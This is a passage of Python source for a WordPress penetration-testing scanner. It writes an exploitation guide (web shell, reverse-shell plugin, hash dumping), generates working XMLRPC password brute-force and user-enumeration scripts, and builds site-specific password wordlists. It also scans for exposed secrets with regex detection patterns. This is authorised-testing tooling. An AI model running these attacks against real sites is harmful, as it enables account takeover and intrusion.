                f.write("   - Edit 404.php or footer.php\n")
                f.write("   - Insert PHP web shell code\n\n")

                f.write("2. **Upload Malicious Plugin:**\n")
                f.write("   - Create plugin with reverse shell\n")
                f.write("   - Upload via Plugins → Add New\n")
                f.write("   - Activate plugin\n\n")

                f.write("3. **Database Access:**\n")
                f.write("   - Check wp-config.php for DB credentials\n")
                f.write("   - Access via phpMyAdmin or MySQL CLI\n")
                f.write("   - Dump password hashes\n\n")

                f.write("---\n\n")
                f.write("**Generated by W.A.D.U.H. Scanner v2.2**\n")

            self.log(f"[+] Exploitation guide exported: {guide_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write exploitation guide: {e}", Fore.RED)

    def generate_poc_scripts(self) -> None:
        """Generate proof-of-concept Python scripts for vulnerabilities"""
        if not self.generate_pocs:
            return

        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        poc_dir = os.path.join(output_path, f"pocs_{host_safe}_{timestamp}")

        if not os.path.exists(poc_dir):
            os.makedirs(poc_dir)

        # Generate XMLRPC brute force PoC
        if self.xmlrpc_enabled and self.found_users:
            poc_filename = os.path.join(poc_dir, "xmlrpc_bruteforce.py")
            try:
                with open(poc_filename, "w", encoding="utf-8") as f:
                    f.write("#!/usr/bin/env python3\n")
                    f.write("\"\"\"\n")
                    f.write("WordPress XMLRPC Brute Force PoC\n")
                    f.write(f"Target: {self.target_url}\n")
                    f.write("AUTHORIZED USE ONLY\n")
                    f.write("\"\"\"\n\n")
                    f.write("import requests\n")
                    f.write("import sys\n\n")

                    f.write(f"TARGET = \"{self.target_url}/xmlrpc.php\"\n")
                    f.write(f"USERNAME = \"{self.found_users[0]}\"\n")
                    f.write("WORDLIST = \"passwords.txt\"  # Create this file with passwords\n\n")

                    f.write("def test_login(username, password):\n")
                    f.write("    payload = f\"\"\"\n")
                    f.write("    <?xml version=\"1.0\"?>\n")
                    f.write("    <methodCall>\n")
                    f.write("        <methodName>wp.getUsersBlogs</methodName>\n")
                    f.write("        <params>\n")
                    f.write("            <param><value><string>{username}</string></value></param>\n")
                    f.write("            <param><value><string>{password}</string></value></param>\n")
                    f.write("        </params>\n")
                    f.write("    </methodCall>\n")
                    f.write("    \"\"\"\n\n")

                    f.write("    try:\n")
                    f.write("        response = requests.post(TARGET, data=payload, timeout=10)\n")
                    f.write("        if \"isAdmin\" in response.text:\n")
                    f.write("            return True\n")
                    f.write("        elif \"403\" in response.text or \"Incorrect\" in response.text:\n")
                    f.write("            return False\n")
                    f.write("    except Exception as e:\n")
                    f.write("        print(f\"Error: {e}\")\n")
                    f.write("    return False\n\n")

                    f.write("def main():\n")
                    f.write("    print(f\"[*] Testing XMLRPC on {TARGET}\")\n")
                    f.write("    print(f\"[*] Username: {USERNAME}\")\n")
                    f.write("    print(f\"[*] Wordlist: {WORDLIST}\\n\")\n\n")

                    f.write("    try:\n")
                    f.write("        with open(WORDLIST, 'r') as f:\n")
                    f.write("            passwords = f.read().splitlines()\n")
                    f.write("    except FileNotFoundError:\n")
                    f.write("        print(f\"[-] Wordlist not found: {WORDLIST}\")\n")
                    f.write("        sys.exit(1)\n\n")

                    f.write("    for i, password in enumerate(passwords, 1):\n")
                    f.write("        print(f\"\\r[{i}/{len(passwords)}] Testing: {password[:20]}\", end='', flush=True)\n")
                    f.write("        if test_login(USERNAME, password):\n")
                    f.write("            print(f\"\\n\\n[+] SUCCESS! Valid credentials found:\")\n")
                    f.write("            print(f\"    Username: {USERNAME}\")\n")
                    f.write("            print(f\"    Password: {password}\")\n")
                    f.write("            return\n\n")

                    f.write("    print(\"\\n\\n[-] No valid credentials found\")\n\n")

                    f.write("if __name__ == \"__main__\":\n")
                    f.write("    main()\n")

                self.log(f"[+] PoC generated: {poc_filename}", Fore.GREEN)
            except Exception as e:
                self.log(f"[!] Failed to generate XMLRPC PoC: {e}", Fore.RED)

        # Generate user enumeration PoC
        poc_filename = os.path.join(poc_dir, "user_enumeration.py")
        try:
            with open(poc_filename, "w", encoding="utf-8") as f:
                f.write("#!/usr/bin/env python3\n")
                f.write("\"\"\"\n")
                f.write("WordPress User Enumeration PoC\n")
                f.write(f"Target: {self.target_url}\n")
                f.write("AUTHORIZED USE ONLY\n")
                f.write("\"\"\"\n\n")
                f.write("import requests\n")
                f.write("import re\n\n")

                f.write(f"TARGET = \"{self.target_url}\"\n\n")

                f.write("def enumerate_users(max_id=10):\n")
                f.write("    print(f\"[*] Enumerating users on {TARGET}\\n\")\n")
                f.write("    found_users = []\n\n")

                f.write("    for user_id in range(1, max_id + 1):\n")
                f.write("        url = f\"{TARGET}/?author={user_id}\"\n")
                f.write("        try:\n")
                f.write("            response = requests.get(url, allow_redirects=True, timeout=10)\n")
                f.write("            if response.status_code == 200:\n")
                f.write("                match = re.search(r'/author/([^/\\'\"]+)', response.url)\n")
                f.write("                if match:\n")
                f.write("                    username = match.group(1)\n")
                f.write("                    found_users.append(username)\n")
                f.write("                    print(f\"[+] User ID {user_id}: {username}\")\n")
                f.write("        except Exception as e:\n")
                f.write("            print(f\"[-] Error testing ID {user_id}: {e}\")\n\n")

                f.write("    print(f\"\\n[*] Found {len(found_users)} users:\")\n")
                f.write("    for user in found_users:\n")
                f.write("        print(f\"    - {user}\")\n\n")

                f.write("    # Save to file\n")
                f.write("    with open('found_users.txt', 'w') as f:\n")
                f.write("        for user in found_users:\n")
                f.write("            f.write(f\"{user}\\n\")\n")
                f.write("    print(f\"\\n[+] Users saved to found_users.txt\")\n\n")

                f.write("if __name__ == \"__main__\":\n")
                f.write("    enumerate_users(max_id=20)\n")

            self.log(f"[+] PoC generated: {poc_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to generate user enumeration PoC: {e}", Fore.RED)

        # Create README for PoCs
        readme_filename = os.path.join(poc_dir, "README.md")
        try:
            with open(readme_filename, "w", encoding="utf-8") as f:
                f.write("# Proof-of-Concept Scripts\n\n")
                f.write(f"Generated by W.A.D.U.H. Scanner v2.2\n\n")
                f.write(f"**Target:** {self.target_url}\n\n")
                f.write("**⚠️ AUTHORIZED USE ONLY - These scripts are for authorized penetration testing**\n\n")
                f.write("## Usage\n\n")
                f.write("1. Make scripts executable:\n")
                f.write("   ```bash\n")
                f.write("   chmod +x *.py\n")
                f.write("   ```\n\n")
                f.write("2. Install dependencies:\n")
                f.write("   ```bash\n")
                f.write("   pip install requests\n")
                f.write("   ```\n\n")
                f.write("3. Run scripts:\n")
                f.write("   ```bash\n")
                f.write("   python3 user_enumeration.py\n")
                if self.xmlrpc_enabled and self.found_users:
                    f.write("   python3 xmlrpc_bruteforce.py\n")
                f.write("   ```\n\n")

            self.log(f"[+] PoC scripts generated in: {poc_dir}", Fore.GREEN + Style.BRIGHT)
        except Exception as e:
            self.log(f"[!] Failed to create PoC README: {e}", Fore.RED)

    # ============================================================================
    # V3.0 FEATURES - TOP 10 IMPLEMENTATIONS
    # ============================================================================

    # FEATURE 1: Multi-Target Scanning with Thread Pool
    def scan_multiple_targets(self) -> None:
        """Scan multiple targets from file with parallel threading"""
        if not self.target_list:
            return

        try:
            with open(self.target_list, 'r', encoding='utf-8') as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            self.log(f"[!] Target file not found: {self.target_list}", Fore.RED)
            return
        except Exception as e:
            self.log(f"[!] Error reading target file: {e}", Fore.RED)
            return

        if not targets:
            self.log("[!] No targets found in file", Fore.RED)
            return

        self.log(f"[*] Multi-Target Scan: {len(targets)} targets with {self.parallel} parallel threads", Fore.CYAN)
        self.log("=" * 80, Fore.CYAN)

        results = []
        completed = 0
        failed = 0

        with ThreadPoolExecutor(max_workers=self.parallel) as executor:
            future_to_target = {executor.submit(self.scan_single_target, target): target for target in targets}

            for future in as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        completed += 1
                        self.log(f"[+] Completed ({completed}/{len(targets)}): {target}", Fore.GREEN)
                    else:
                        failed += 1
                        self.log(f"[!] Failed ({failed}/{len(targets)}): {target}", Fore.RED)
                except Exception as e:
                    failed += 1
                    self.log(f"[!] Error scanning {target}: {e}", Fore.RED)

        # Generate master report
        self.log("\n" + "=" * 80, Fore.CYAN)
        self.log(f"[*] Scan Complete: {completed} successful, {failed} failed", Fore.CYAN)
        self.generate_master_report(results)

    def scan_single_target(self, target_url: str) -> Optional[Dict]:
        """Wrapper to scan a single target and return results"""
        try:
            # Normalize URL
            target_url = target_url.rstrip('/')
            if not target_url.startswith("http"):
                target_url = "http://" + target_url

            # Create a new scanner instance for this target
            # We need to preserve the args but override the URL
            import copy
            from argparse import Namespace

            # Create minimal args for single scan
            args = Namespace(
                url=target_url,
                verify_ssl=self.verify_ssl,
                verbose=False,  # Disable verbose for multi-target
                quiet=True,  # Enable quiet for cleaner output
                rate_limit=self.rate_limit,
                deep=self.deep_scan,
                output=self.output_dir,
                wpscan_token=self.wpscan_token,
                export_metasploit=False,  # Disable individual exports
                export_sqlmap=False,
                generate_pocs=False,
                export_nuclei=False,
                export_burp=False,
                export_zap=False,
                generate_wordlist=False,
                scan_secrets=self.scan_secrets,
                scan_cors=self.scan_cors,
                scan_cookies=self.scan_cookies,
                scan_ssl=self.scan_ssl,
                scan_graphql=self.scan_graphql,
                enhanced_backups=self.enhanced_backups,
                webhook=None,  # Disable webhooks for individual scans
                compare_with=None,
                cvss_scoring=self.cvss_scoring,
                target_list=None,  # No nested multi-target
                parallel=3,
                no_color=False
            )

            scanner = YikesScanner(args)
            scanner.target_url = target_url

            # Run scan
            if scanner.check_connection():
                scanner.detect_version()
                scanner.enumerate_plugins_themes()
                scanner.check_security_headers()
                scanner.check_wp_artifacts()
                scanner.check_directory_listing()
                scanner.check_robots_sitemap()
                scanner.check_sensitive_files()
                scanner.test_user_enumeration()
                scanner.test_xmlrpc_vulnerabilities()
                scanner.check_database_errors()
                scanner.analyze_rest_api()

                # v3.0 scans
                if self.scan_secrets:
                    scanner.scan_for_secrets()
                if self.enhanced_backups:
                    scanner.enhanced_backup_fuzzing()
                if self.scan_cors:
                    scanner.test_cors_misconfiguration()
                if self.scan_cookies:
                    scanner.analyze_cookies()
                if self.scan_ssl:
                    scanner.analyze_ssl_tls()

                return {
                    'target': target_url,
                    'wp_version': scanner.wp_version,
                    'vulnerabilities': scanner.vulnerabilities,
                    'info_leaks': scanner.info_leaks,
                    'security_issues': scanner.security_issues,
                    'plugins': scanner.detected_plugins,
                    'themes': scanner.detected_themes,
                    'users': scanner.found_users,
                    'xmlrpc_enabled': scanner.xmlrpc_enabled
                }
            else:
                return None

        except Exception as e:
            self.log(f"[!] Error in scan_single_target for {target_url}: {e}", Fore.RED)
            return None

    def generate_master_report(self, results: List[Dict]) -> None:
        """Generate consolidated report for multi-target scan"""
        try:
            output_path = self.output_dir if self.output_dir else "."
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            master_file = os.path.join(output_path, f"waduh_master_report_{timestamp}.json")

            # Calculate statistics
            total_vulns = sum(len(r['vulnerabilities']) for r in results)
            total_info_leaks = sum(len(r['info_leaks']) for r in results)
            total_issues = sum(len(r['security_issues']) for r in results)
            wp_versions = {}
            for r in results:
                ver = r['wp_version'] or 'Unknown'
                wp_versions[ver] = wp_versions.get(ver, 0) + 1

            master_data = {
                'scan_date': datetime.now(timezone.utc).isoformat(),
                'scanner_version': 'W.A.D.U.H. v3.0',
                'total_targets': len(results),
                'summary': {
                    'total_vulnerabilities': total_vulns,
                    'total_info_leaks': total_info_leaks,
                    'total_security_issues': total_issues,
                    'wordpress_versions': wp_versions
                },
                'targets': results
            }

            with open(master_file, 'w', encoding='utf-8') as f:
                json.dump(master_data, f, indent=2)

            self.log(f"\n[+] Master report saved: {master_file}", Fore.GREEN + Style.BRIGHT)
            self.log(f"    Total Vulnerabilities: {total_vulns}", Fore.YELLOW)
            self.log(f"    Total Info Leaks: {total_info_leaks}", Fore.YELLOW)
            self.log(f"    Total Security Issues: {total_issues}", Fore.YELLOW)

            # Send webhook if configured
            if self.webhook:
                self.send_webhook({
                    'type': 'multi_target_complete',
                    'total_targets': len(results),
                    'total_vulnerabilities': total_vulns
                })

        except Exception as e:
            self.log(f"[!] Failed to generate master report: {e}", Fore.RED)

    # FEATURE 2: Custom Wordlist Generation
    def generate_custom_wordlist(self) -> None:
        """Generate site-specific wordlist for password attacks"""
        if not self.generate_wordlist:
            return

        self.log("[*] Generating custom wordlist from site content...", Fore.BLUE)
        words = set()

        try:
            # Extract from HTML content
            if self.homepage_html:
                # Company names, brands (capitalized words)
                words.update(re.findall(r'\b[A-Z][a-z]{2,15}\b', self.homepage_html))

                # Titles and headings
                for match in re.findall(r'<title>([^<]+)</title>', self.homepage_html, re.I):
                    words.update(match.split())

                # Meta descriptions
                for match in re.findall(r'content="([^"]+)"', self.homepage_html):
                    words.update(match.split())

                # Common words from paragraphs
                for match in re.findall(r'<p>([^<]+)</p>', self.homepage_html):
                    words.update(match.split())

            # Add detected usernames
            words.update(self.found_users)

            # Add plugin/theme names
            for plugin in self.detected_plugins:
                words.add(plugin['slug'])
                words.update(plugin['slug'].split('-'))

            for theme in self.detected_themes:
                words.add(theme['slug'])
                words.update(theme['slug'].split('-'))

            # Add site-specific variations
            parsed = urlparse(self.target_url)
            domain_parts = parsed.netloc.split('.')
            words.update(domain_parts)

            # Add WordPress version numbers
            if self.wp_version:
                words.add(self.wp_version.replace('.', ''))
                words.add(self.wp_version)

            # Add year variations
            current_year = datetime.now().year
            for year in range(current_year - 5, current_year + 2):
                words.add(str(year))

            # Generate variations with common suffixes
            base_words = list(words.copy())
            for word in base_words[:100]:  # Limit to avoid explosion
                if len(word) >= 3:
                    words.add(f"{word}123")
                    words.add(f"{word}{current_year}")
                    words.add(f"{word}!")
                    words.add(f"{word}@")
                    words.add(f"{word}#")
                    words.add(word.upper())
                    words.add(word.lower())
                    words.add(word.capitalize())

            # Common WordPress defaults
            wp_defaults = [
                'admin', 'administrator', 'wordpress', 'wp', 'password', 'pass',
                'admin123', 'password123', 'welcome', 'letmein', 'qwerty',
                'login', 'root', 'test', 'demo', 'user', 'backup'
            ]
            words.update(wp_defaults)

            # Filter and clean
            wordlist = sorted([w.strip() for w in words if len(w) >= 3 and len(w) <= 25 and w.strip()])
            wordlist = [w for w in wordlist if w.isalnum() or any(c in w for c in '!@#$')]

            # Export
            output_path = self.output_dir if self.output_dir else "."
            host = urlparse(self.target_url).netloc.replace(":", "_").replace("/", "_")
            wordlist_file = os.path.join(output_path, f"waduh_{host}_wordlist.txt")

            with open(wordlist_file, 'w', encoding='utf-8') as f:
                for word in wordlist:
                    f.write(f"{word}\n")

            self.log(f"    [+] Generated custom wordlist: {wordlist_file} ({len(wordlist)} words)", Fore.GREEN)

            # Also create a smaller "top 100" version
            if len(wordlist) > 100:
                top100_file = os.path.join(output_path, f"waduh_{host}_top100.txt")
                with open(top100_file, 'w', encoding='utf-8') as f:
                    for word in wordlist[:100]:
                        f.write(f"{word}\n")
                self.log(f"    [+] Top 100 wordlist: {top100_file}", Fore.GREEN)

        except Exception as e:
            self.log(f"    [!] Failed to generate wordlist: {e}", Fore.RED)

    # FEATURE 3: Nuclei Template Export
    def export_nuclei_templates(self) -> None:
        """Export vulnerabilities as Nuclei YAML templates"""
        if not self.export_nuclei:
            return

        try:
            output_path = self.output_dir if self.output_dir else "."
            nuclei_dir = os.path.join(output_path, "nuclei-templates")
            os.makedirs(nuclei_dir, exist_ok=True)

            self.log("[*] Exporting Nuclei templates...", Fore.BLUE)
            template_count = 0

            for vuln in self.vulnerabilities:
                template_name = re.sub(r'[^a-z0-9]+', '-', vuln['title'].lower()).strip('-')
                template_file = os.path.join(nuclei_dir, f"{template_name}.yaml")

                severity_map = {
                    'critical': 'critical',
                    'high': 'high',
                    'medium': 'medium',
                    'low': 'low',
                    'info': 'info'
                }
                severity = severity_map.get(vuln.get('severity', 'info'), 'info')

                # Generate YAML template
                template = f"""id: {template_name}

info:
  name: "{vuln['title']}"
  author: waduh-scanner
  severity: {severity}
  description: |
    {vuln['description']}
  reference:
    - https://github.com/yourusername/waduh
  tags: wordpress,{severity},waduh

requests:
  - method: GET
    path:
      - "{{{{BaseURL}}}}"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "WordPress"
        part: body

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: version
        regex:
          - 'WordPress ([0-9.]+)'
        group: 1
"""

                with open(template_file, 'w', encoding='utf-8') as f:
                    f.write(template)

                template_count += 1

            self.log(f"    [+] Nuclei templates exported to: {nuclei_dir} ({template_count} templates)", Fore.GREEN)
            self.log(f"    [+] Usage: nuclei -t {nuclei_dir} -u {self.target_url}", Fore.CYAN)

        except Exception as e:
            self.log(f"    [!] Failed to export Nuclei templates: {e}", Fore.RED)

    # FEATURE 4: Enhanced Backup File Fuzzing
    def enhanced_backup_fuzzing(self) -> None:
        """Enhanced backup file detection with 50+ patterns"""
        if not self.enhanced_backups:
            return

        self.log("[*] Enhanced Backup Fuzzing (50+ patterns)...", Fore.BLUE)
        found_backups = []

        # Get base domain/sitename
        parsed = urlparse(self.target_url)
        hostname = parsed.netloc.split(':')[0]
        sitename = hostname.split('.')[0]

        # Date-based patterns
        today = datetime.now()
        dates = [
            today.strftime("%Y%m%d"),
            today.strftime("%Y-%m-%d"),
            today.strftime("%d%m%Y"),
            (today.replace(day=1)).strftime("%Y%m%d"),  # First of month
        ]

        # Common backup patterns
        patterns = []

        # WordPress backups
        patterns.extend([
            'wp-content/backup', 'wp-content/backups', 'wp-content/uploads/backup',
            'backup', 'backups', 'old', 'backup-db', 'sql-backup'
        ])

        # Plugin backups
        patterns.extend([
            'wp-content/ai1wm-backups', 'wp-content/updraft', 'wp-content/backupbuddy_backups',
            'wp-snapshots', 'wp-content/plugins/backupwordpress/backups'
        ])

        # File-based backups
        for base in ['backup', 'db_backup', 'database', 'dump', 'wordpress', 'wp', sitename, hostname]:
            for ext in ['.zip', '.tar.gz', '.sql', '.sql.gz', '.tar', '.bak', '.7z', '.rar']:
                patterns.append(f"{base}{ext}")
                for date in dates:
                    patterns.append(f"{base}_{date}{ext}")
                    patterns.append(f"{base}-{date}{ext}")

        # Common backup filenames
        patterns.extend([
            'database.sql', 'dump.sql', 'backup.sql', 'db.sql', 'mysql.sql',
            'backup.tar.gz', 'site-backup.zip', 'complete.zip', 'full-backup.zip',
            'wordpress.sql', 'wp.sql', 'db_backup.sql'
        ])

        tested = 0
        for pattern in set(patterns):  # Remove duplicates
            test_url = urljoin(self.target_url, pattern)

            try:
                r = self.make_request(test_url, timeout=(3, 8))
                tested += 1

                if r and r.status_code == 200:
                    size = len(r.content)
                    if size > 1024:  # More than 1KB
                        found_backups.append({
                            'url': test_url,
                            'size': size,
                            'pattern': pattern
                        })
                        self.log(f"    [!] FOUND: {test_url} ({size} bytes)", Fore.RED + Style.BRIGHT)
                        self.add_vulnerability(
                            "Exposed Backup File",
                            f"Accessible backup file found at: {test_url} ({size} bytes)",
                            "critical"
                        )

                if tested % 10 == 0:
                    self.log(f"    [*] Tested {tested}/{len(set(patterns))} patterns...", Fore.YELLOW)

            except Exception:
                pass

        if found_backups:
            self.log(f"    [!] Found {len(found_backups)} exposed backup files!", Fore.RED + Style.BRIGHT)
        else:
            self.log(f"    [+] No backup files found (tested {tested} patterns)", Fore.GREEN)

    # FEATURE 5: API Key/Secret Scanner
    def scan_for_secrets(self) -> None:
        """Scan JavaScript and HTML for exposed API keys and secrets"""
        if not self.scan_secrets:
            return

        self.log("[*] Scanning for exposed API keys and secrets...", Fore.BLUE)
        secrets_found = []

        # Regex patterns for common secrets
        patterns = {
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key': r'aws_secret_access_key\s*=\s*["\']([^"\']+)["\']',
            'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
            'GitHub Token': r'ghp_[0-9a-zA-Z]{36}',
            'GitHub OAuth': r'gho_[0-9a-zA-Z]{36}',
            'Slack Token': r'xox[baprs]-[0-9a-zA-Z]{10,48}',
            'Slack Webhook': r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+',
            'Stripe API Key': r'sk_live_[0-9a-zA-Z]{24}',
            'Stripe Publishable': r'pk_live_[0-9a-zA-Z]{24}',
            'Private Key': r'-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----',
            'Database URL': r'(mysql|postgresql|mongodb|redis)://[^\s<>"]+',
            'API Endpoint': r'https?://api\.[^\s<>"]+',
            'Bearer Token': r'[Bb]earer\s+[A-Za-z0-9\-._~+/]+=*',
            'JWT Token': r'eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]+',
            'API Key Generic': r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9]{20,})["\']',
            'Password': r'password["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
            'Secret Generic': r'secret["\']?\s*[:=]\s*["\']([a-zA-Z0-9]{16,})["\']',
        }

        # Scan homepage HTML
        for secret_type, pattern in patterns.items():
            try:
                matches = re.findall(pattern, self.homepage_html, re.I)
                for match in matches:
                    secret_value = match if isinstance(match, str) else match[0] if match else ''
                    if secret_value and len(secret_value) > 5:
                        secrets_found.append({
                            'type': secret_type,
                            'value': secret_value[:50] + '...' if len(secret_value) > 50 else secret_value,
                            'location': 'Homepage HTML'
                        })
                        self.log(f"    [!] {secret_type} in HTML", Fore.RED)
                        self.add_vulnerability(
                            f"Exposed {secret_type}",
                            f"Found {secret_type} in page source",
                            "critical"
                        )
            except Exception:
                pass

        # Find and scan JavaScript files
        js_files = re.findall(r'<script[^>]+src=["\']([^"\']+\.js)["\']', self.homepage_html)
        js_files.extend(re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', self.homepage_html))

        # Also check common WordPress JS locations
        js_files.extend([
            '/wp-includes/js/wp-api.js',
            '/wp-content/themes/*/js/main.js',
            '/wp-content/themes/*/js/scripts.js',
            '/wp-content/themes/*/assets/js/main.js'
        ])

        scanned_js = set()
        for js_url in js_files[:25]:  # Limit to 25 files
            if not js_url.startswith('http'):
                js_url = urljoin(self.target_url, js_url)

            if js_url in scanned_js:
                continue
            scanned_js.add(js_url)

            try:
                r = self.make_request(js_url, timeout=(5, 10))
                if r and r.status_code == 200:
                    for secret_type, pattern in patterns.items():
                        matches = re.findall(pattern, r.text, re.I)
                        for match in matches:
                            secret_value = match if isinstance(match, str) else match[0] if match else ''
                            if secret_value and len(secret_value) > 5:
                                secrets_found.append({
                                    'type': secret_type,
                                    'value': secret_value[:50] + '...' if len(secret_value) > 50 else secret_value,
                                    'location': js_url
                                })
                                self.log(f"    [!] {secret_type} in {js_url}", Fore.RED)
                                self.add_vulnerability(
                                    f"Exposed {secret_type} in JavaScript",
                                    f"Found in {js_url}",
                                    "critical"
                                )
            except Exception:
                pass

        if secrets_found:
            self.log(f"    [!] Found {len(secrets_found)} exposed secrets!", Fore.RED + Style.BRIGHT)
        else:
            self.log("    [+] No exposed secrets found", Fore.GREEN)

    # FEATURE 6: Webhook Notifications
    def send_webhook(self, data: Dict) -> None:
        """Send webhook notification to Slack/Discord/Teams"""
        if not self.webhook:
            return

        try:
            # Detect webhook type
            if 'slack.com' in self.webhook:
                self._send_slack_webhook(data)
            elif 'discord.com' in self.webhook:
                self._send_discord_webhook(data)
            elif 'office.com' in self.webhook or 'outlook.com' in self.webhook:
                self._send_teams_webhook(data)
            else:
                # Generic webhook
                self._send_generic_webhook(data)
        except Exception as e:
            self.log(f"[!] Webhook notification failed: {e}", Fore.YELLOW)

    def _send_slack_webhook(self, data: Dict) -> None:
        """Send Slack webhook"""
        vuln_count = len(self.vulnerabilities)
        severity_counts = {}
        for v in self.vulnerabilities:
            sev = v.get('severity', 'info')
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        color = 'danger' if vuln_count > 0 else 'good'

        payload = {
            "text": f"W.A.D.U.H. Scan Complete: {self.target_url}",
            "attachments": [{
                "color": color,
                "fields": [
                    {"title": "Target", "value": self.target_url, "short": True},
                    {"title": "WordPress Version", "value": self.wp_version or "Unknown", "short": True},
                    {"title": "Vulnerabilities", "value": str(vuln_count), "short": True},
                    {"title": "Severity", "value": f"Critical: {severity_counts.get('critical', 0)}, High: {severity_counts.get('high', 0)}", "short": True},
                ],
                "footer": "W.A.D.U.H. Scanner v3.0",
                "ts": int(time.time())
            }]
        }

        r = requests.post(self.webhook, json=payload, timeout=10)
        if r.status_code == 200:
            self.log("[+] Slack notification sent", Fore.GREEN)

    def _send_discord_webhook(self, data: Dict) -> None:
        """Send Discord webhook"""
        vuln_count = len(self.vulnerabilities)

        embed = {
            "title": "W.A.D.U.H. Scan Complete",
            "description": f"Target: {self.target_url}",
            "color": 15158332 if vuln_count > 0 else 3066993,  # Red or green
            "fields": [
                {"name": "WordPress Version", "value": self.wp_version or "Unknown", "inline": True},
                {"name": "Vulnerabilities", "value": str(vuln_count), "inline": True},
                {"name": "Info Leaks", "value": str(len(self.info_leaks)), "inline": True},
            ],
            "footer": {"text": "W.A.D.U.H. Scanner v3.0"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        payload = {"embeds": [embed]}

        r = requests.post(self.webhook, json=payload, timeout=10)
        if r.status_code == 204:
            self.log("[+] Discord notification sent", Fore.GREEN)

    def _send_teams_webhook(self, data: Dict) -> None:
        """Send Microsoft Teams webhook"""
        vuln_count = len(self.vulnerabilities)

        payload = {
            "@type": "MessageCard",
            "@context": "https://schema.org/extensions",
            "summary": f"W.A.D.U.H. Scan Complete: {self.target_url}",
            "themeColor": "FF0000" if vuln_count > 0 else "00FF00",
            "title": "W.A.D.U.H. Scan Complete",
            "sections": [{
                "activityTitle": f"Target: {self.target_url}",
                "facts": [
                    {"name": "WordPress Version", "value": self.wp_version or "Unknown"},
                    {"name": "Vulnerabilities", "value": str(vuln_count)},
                    {"name": "Info Leaks", "value": str(len(self.info_leaks))},
                ],
                "markdown": True
            }]
        }

        r = requests.post(self.webhook, json=payload, timeout=10)
        if r.status_code == 200:
            self.log("[+] Teams notification sent", Fore.GREEN)

    def _send_generic_webhook(self, data: Dict) -> None:
        """Send generic webhook"""
        payload = {
            "scanner": "W.A.D.U.H. v3.0",
            "target": self.target_url,
            "wp_version": self.wp_version,
            "vulnerabilities": len(self.vulnerabilities),
            "info_leaks": len(self.info_leaks),
            "security_issues": len(self.security_issues),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": data
        }

        r = requests.post(self.webhook, json=payload, timeout=10)
        if r.status_code in [200, 201, 202, 204]:
            self.log("[+] Webhook notification sent", Fore.GREEN)

    # FEATURE 7: Comparison Mode
    def compare_with_previous_scan(self) -> None:
        """Compare current scan with previous scan JSON"""
        if not self.compare_with:
            return

        try:
            self.log("[*] Comparing with previous scan...", Fore.BLUE)

            with open(self.compare_with, 'r', encoding='utf-8') as f:
                previous = json.load(f)

            prev_vulns = {v['title']: v for v in previous.get('vulnerabilities', [])}
            curr_vulns = {v['title']: v for v in self.vulnerabilities}

            # Find new vulnerabilities
            new_vulns = [title for title in curr_vulns if title not in prev_vulns]

            # Find fixed vulnerabilities
            fixed_vulns = [title for title in prev_vulns if title not in curr_vulns]

            # Find changed severity
            changed_severity = []
            for title in curr_vulns:
                if title in prev_vulns:
                    if curr_vulns[title].get('severity') != prev_vulns[title].get('severity'):
                        changed_severity.append({
                            'title': title,
                            'old_severity': prev_vulns[title].get('severity'),
                            'new_severity': curr_vulns[title].get('severity')
                        })

            # Display results
            self.log("\n" + "=" * 80, Fore.CYAN)
            self.log("SCAN COMPARISON RESULTS", Fore.CYAN + Style.BRIGHT)
            self.log("=" * 80, Fore.CYAN)

            if new_vulns:
                self.log(f"\n[!] NEW VULNERABILITIES ({len(new_vulns)}):", Fore.RED + Style.BRIGHT)
                for title in new_vulns:
                    severity = curr_vulns[title].get('severity', 'unknown')
                    self.log(f"    + {title} [{severity}]", Fore.RED)
            else:
                self.log("\n[+] No new vulnerabilities", Fore.GREEN)

            if fixed_vulns:
                self.log(f"\n[+] FIXED VULNERABILITIES ({len(fixed_vulns)}):", Fore.GREEN + Style.BRIGHT)
                for title in fixed_vulns:
                    self.log(f"    - {title}", Fore.GREEN)
            else:
                self.log("\n[-] No vulnerabilities fixed", Fore.YELLOW)

            if changed_severity:
                self.log(f"\n[*] CHANGED SEVERITY ({len(changed_severity)}):", Fore.YELLOW)
                for change in changed_severity:
                    self.log(f"    ~ {change['title']}: {change['old_severity']} -> {change['new_severity']}", Fore.YELLOW)

            # Check version change
            prev_version = previous.get('wordpress_version')
            if prev_version != self.wp_version:
                self.log(f"\n[*] WordPress version changed: {prev_version} -> {self.wp_version}", Fore.CYAN)

            # Save comparison report
            output_path = self.output_dir if self.output_dir else "."
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            host = urlparse(self.target_url).netloc.replace(":", "_")
            comparison_file = os.path.join(output_path, f"waduh_{host}_comparison_{timestamp}.json")

            comparison_data = {
                'comparison_date': datetime.now(timezone.utc).isoformat(),
                'previous_scan': self.compare_with,
                'target': self.target_url,
                'new_vulnerabilities': new_vulns,
                'fixed_vulnerabilities': fixed_vulns,
                'changed_severity': changed_severity,
                'version_change': {
                    'previous': prev_version,
                    'current': self.wp_version
                }
            }

            with open(comparison_file, 'w', encoding='utf-8') as f:
                json.dump(comparison_data, f, indent=2)

            self.log(f"\n[+] Comparison report saved: {comparison_file}", Fore.GREEN)

